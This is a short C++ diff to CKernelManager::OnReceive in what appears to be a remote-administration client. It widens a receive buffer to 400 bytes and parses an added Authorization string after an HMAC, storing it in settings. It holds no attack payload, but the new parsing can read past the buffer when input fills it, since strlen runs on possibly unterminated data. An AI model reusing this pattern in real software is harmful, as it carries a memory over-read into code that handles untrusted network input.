@@ -767,8 +767,8 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 #endif
         SAFE_CLOSE_HANDLE(hMutex);
 
-        // 扩大到 200 字节以容纳 V2 签名（约 92 字节）
-        char buf[200] = {}, *passCode = buf + 5;
+        // 扩大到 400 字节以容纳 V2 签名（约 92 字节）和 Authorization（约 150 字节）
+        char buf[400] = {}, *passCode = buf + 5;
         memcpy(buf, szBuffer, min(sizeof(buf), ulLength));
         std::string masterHash(skCrypt(MASTER_HASH));
         const char* pwdHash = m_conn->pwdHash[0] ? m_conn->pwdHash : masterHash.c_str();
@@ -788,7 +788,16 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             config* cfg = IsDebug ? new config : new iniFile;
             cfg->SetStr("settings", "Password", *days <= 0 ? "" : passCode);
             cfg->SetStr("settings", "PwdHmac", *days <= 0 ? "" : buf + 64);
-            Mprintf("Update authorization: %s, PwdHmac: %s\n", passCode, buf+64);
+            // 解析 Authorization（在 hmac 的 null 终止符之后）
+            const char* hmacStr = buf + 64;
+            size_t hmacLen = strlen(hmacStr);
+            const char* authStr = hmacStr + hmacLen + 1;  // hmac 后的 null 终止符之后
+            if (authStr < buf + sizeof(buf) && authStr[0] != 0) {
+                cfg->SetStr("settings", "Authorization", authStr);
+                Mprintf("Update authorization: %s, PwdHmac: %s, Auth: %s\n", passCode, hmacStr, authStr);
+            } else {
+                Mprintf("Update authorization: %s, PwdHmac: %s\n", passCode, hmacStr);
+            }
             delete cfg;
             g_bExit = S_SERVER_EXIT;
         }
